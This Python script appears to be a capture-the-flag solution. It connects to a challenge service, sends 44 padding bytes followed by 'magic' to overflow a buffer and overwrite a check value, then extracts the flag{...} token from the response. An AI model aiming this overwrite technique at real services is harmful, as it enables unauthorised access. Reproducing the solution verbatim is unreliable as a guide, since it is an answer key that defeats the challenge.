#!/usr/bin/env python3
from __future__ import annotations

import os
import re
import socket


def main() -> None:
    host = os.getenv('HOST', '127.0.0.1')
    port = int(os.getenv('PORT', '8080'))
    with socket.create_connection((host, port), timeout=3) as conn:
        conn.recv(256)
        conn.sendall(b'A' * 44 + b'magic\n')
        conn.shutdown(socket.SHUT_WR)
        chunks = []
        while True:
            chunk = conn.recv(256)
            if not chunk:
                break
            chunks.append(chunk)
    data = b''.join(chunks).decode('utf-8', errors='ignore')
    match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', data)
    if not match:
        raise SystemExit('flag not found')
    print(match.group(0))


if __name__ == '__main__':
    main()
